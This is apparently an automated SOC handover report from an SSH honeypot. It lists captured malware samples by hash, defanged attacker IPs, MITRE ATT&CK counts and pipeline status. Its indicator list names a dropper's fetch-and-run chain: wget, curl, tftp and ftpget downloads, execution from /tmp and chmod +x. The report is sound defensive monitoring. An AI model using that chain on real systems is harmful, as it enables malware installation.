| `183fb8e38eeb1160f392f6d3c473752bc5b183a5c744f23a31dcc5ae2fda87f5` | Bash Script | `183fb8e38eeb1160...` | 82/100 | 🔴 HIGH | **32/75** 🔴 |
| `1858c51b58e913ca8d868ea94493ad1c74fad15ce283d94c10c22ceb3e92541d` | ELF Binary (Linux executable) (AArch64 64-bit) | `1858c51b58e913ca...` | 40/100 | 🟡 MEDIUM | **26/75** 🔴 |
| `197c74408e15bd1168105f564f96aace4fd4819961b724630bf5a6be4878daf8` | Bash Script | `197c74408e15bd11...` | 69/100 | 🟡 MEDIUM | **24/75** 🔴 |
| `1e7c134cf160b486708c40c21f671cd6f53c7578a8047a4eb22f668476e0c4c4` | ELF Binary (Linux executable) (unknown (e_machine=0x102) 64-bit) | `1e7c134cf160b486...` | 50/100 | 🟡 MEDIUM | **27/74** 🔴 |
| `1ed8ba8b6936fd378c18a7aafeef6db8575f8ce679ab93ae7c1b36493f7bd65b` | ELF Binary (Linux executable) (MIPS 32-bit) | `1ed8ba8b6936fd37...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `1eecf2377d20768c28d741e21affaa53cf26db0d083efdbf43a92fa938b7e4be` | ELF Binary (Linux executable) (ARM 32-bit) | `1eecf2377d20768c...` | 44/100 | 🟡 MEDIUM | **35/75** 🔴 |
| `1ef0eb60318495dd0cb100fc828f28237d487b800605c7cc54155cf34582598b` | ELF Binary (Linux executable) (x86-64 64-bit) | `1ef0eb60318495dd...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `20260630-221457-3e8812e60d6c-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144928-0dd2c2474d24-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144929-0dd2c2474d24-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144929-0dd2c2474d24-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144929-0dd2c2474d24-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260801-061430-edcaf401de58-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260801-061430-edcaf401de58-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260801-061430-edcaf401de58-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260801-061430-edcaf401de58-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260807-060110-c733cc2a6a9b-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260807-060110-c733cc2a6a9b-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260807-060110-c733cc2a6a9b-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260807-060110-c733cc2a6a9b-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `21e99667e2f0e73d12aae89f8cabd338426ab1fe4ce828ec93c07de615ef754c` | ELF Binary (Linux executable) (AArch64 64-bit) | `21e99667e2f0e73d...` | 63/100 | 🟡 MEDIUM | **34/75** 🔴 |
| `27d205dc183ea2fad0e55e10b206404be20908e39a74569ff99182d7326ed9c0` | ELF Binary (Linux executable) (x86-64 64-bit) | `27d205dc183ea2fa...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `287962211de7bcadb39f7576732438b43ee6aab420ec23c29a9d12a8151a547f` | ELF Binary (Linux executable) (x86 32-bit) | `287962211de7bcad...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `289fd4a7a10aaf8aa313ab80cc170018fc662d0a7d034a3b92b9d3d3945b0736` | ELF Binary (Linux executable) (x86-64 64-bit) | `289fd4a7a10aaf8a...` | 45/100 | 🟡 MEDIUM | **37/74** 🔴 |
| `2a39d592018600e4b3db2caed6cdaa8c651d3dacbebf8ac1f0960e493843c435` | ELF Binary (Linux executable) (x86-64 64-bit) | `2a39d592018600e4...` | 46/100 | 🟡 MEDIUM | **40/75** 🔴 |
| `2bd2ab1d4b75aa2b4eed1af697188b8bce35a882faf4335cb4fafc2847197995` | ELF Binary (Linux executable) (unknown (e_machine=0x04) 32-bit) | `2bd2ab1d4b75aa2b...` | 53/100 | 🟡 MEDIUM | **33/74** 🔴 |
| `2f206563640dd66a743ffd493ce0e3c31a8fc5a24b9f5d2b540fc22d45c13d66` | ELF Binary (Linux executable) (x86 32-bit) | `2f206563640dd66a...` | 42/100 | 🟡 MEDIUM | **31/75** 🔴 |
| `31d4181843b1ed10a7e7cb3f108f6d6c50a7a4452ee52ddacabe8ca77260615e` | Bash Script | `31d4181843b1ed10...` | 60/100 | 🟡 MEDIUM | **26/75** 🔴 |
| `3552f719a379865960a169e2dacea968f4e8f46bd31907f2f89df431d09d9d9e` | ELF Binary (Linux executable) (x86-64 64-bit) | `3552f719a3798659...` | 46/100 | 🟡 MEDIUM | **40/74** 🔴 |
| `3625cfdcd6d434bfa672753ef4b197df8a01388d220bafc9edfa2d0d29c7fcef` | ELF Binary (Linux executable) (x86-64 64-bit) | `3625cfdcd6d434bf...` | 46/100 | 🟡 MEDIUM | **40/75** 🔴 |

**Suspicious Indicators — HIGH Severity Samples:**

_`09591253a95411d60c2b0d5384924aa7cafbceec1467c951c6bbb1655d748f0b` (09591253a95411d60c2b0d53...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `Execution from /tmp` — `/tmp/condi`
- `IP:Port (possible C2)` — `255.255.255[.]255:1900`

_`183fb8e38eeb1160f392f6d3c473752bc5b183a5c744f23a31dcc5ae2fda87f5` (183fb8e38eeb1160f392f6d3...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `chmod +x (make executable)` — `chmod +x`

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `70.89.116[.]5` | US | Comcast Cable Communications, LLC | **100** ⚠️ | 50 |
| `103.93.37[.]178` | IN | Ngc Broadband Pvt. Ltd. | **100** ⚠️ | 50 |
| `124.133.10[.]66` | CN | JINAN SONGJIAN NETBAR | **100** ⚠️ | 48 |
| `2.55.126[.]88` | IL | Partner Communications Ltd. | **100** ⚠️ | 50 |
| `164.92.115[.]22` | US | DigitalOcean, LLC | **100** ⚠️ | 7 |
| `91.92.42[.]7` | NL | TechTies Inc. | **100** ⚠️ | 27 |
| `217.211.208[.]125` | SE | Telia Network Services | **100** ⚠️ | 37 |
| `194.165.16[.]121` | LT | Flyservers S.A. | **100** ⚠️ | 13 |
| `124.239.129[.]2` | CN | CHINANET hebei province network | **100** ⚠️ | 50 |
| `111.70.32[.]11` | TW | CHT-Mobile business Group,Chunghwa | **100** ⚠️ | 42 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 336 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 319 |
| [T1083](https://attack.mitre.org/techniques/T1083) | 15 |
| [T1222.002](https://attack.mitre.org/techniques/T1222/002) | 13 |
| [T1059.004](https://attack.mitre.org/techniques/T1059/004) | 13 |

---

## 🔕 False Positive Summary (119 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 114 |
| AbuseIPDB score 23 below threshold 25 | 3 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 2 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 393 cases |
| Tool 34  | Credential Extractor        | ✅ 337 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 11 fingerprints |
| Tool 36  | Command Clustering          | ✅ 6 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 63 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 119 filtered (30.3%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 49 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 49 files |
| Tool 33  | YARA Classifier             | ✅ 22 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 251 priority case(s) shown individually · 9 recon entry/entries in table (6 group(s) consolidating 20 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

## 🛡️ CIS Controls Snapshot

| Control | Name | Status | Evidence |
|---|---|---|---|
| CIS-1 | Asset Inventory | ACTIVE | assets.json updated every pipeline run by Tool 05 — covers VM2 directly and VM1 via SSH relay |
| CIS-2 | Software Inventory | MONITORING | data/tool_manifest.json auto-generated from pipeline.yml each run — tracks all active tools, languages, and I/O paths |
| CIS-3 | Data Protection | ACTIVE | R2 archive encrypted at rest — thirha-raw-archive |
| CIS-4 | Secure Configuration | ACTIVE | haproxy.cfg, cowrie.cfg, VCN rules in config/ |
| CIS-5 | Account Management | ACTIVE | Two key pairs, dedicated cowrie user, no shared credentials |
| CIS-6 | Access Control | ACTIVE | Pipeline key vs personal key separation, GitHub Secrets |
| CIS-7 | Vulnerability Management | MONITORING | Oracle security patches — pending regular cadence |
| CIS-8 | Audit Log Management | ACTIVE | cowrie.json + cowrie.log dual streams, 59-day corpus |
| CIS-9 | Email/Web Protection | PLANNED | cloudflared tunnels planned — direct IP exposure currently |
| CIS-10 | Malware Defence | ACTIVE | Tool 31 malware analysis + Tool 33 YARA classification |
| CIS-11 | Data Recovery | ACTIVE | R2 archive, EBS snapshots, runbook recovery procedures |
| CIS-12 | Network Infrastructure | ACTIVE | VCN private networking, HAProxy TCP LB, Cloudflare DNS |

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `Aegispub/thir-ha · Oracle Cloud HA_  
_Report time: 2026-08-08T20:36:05Z_
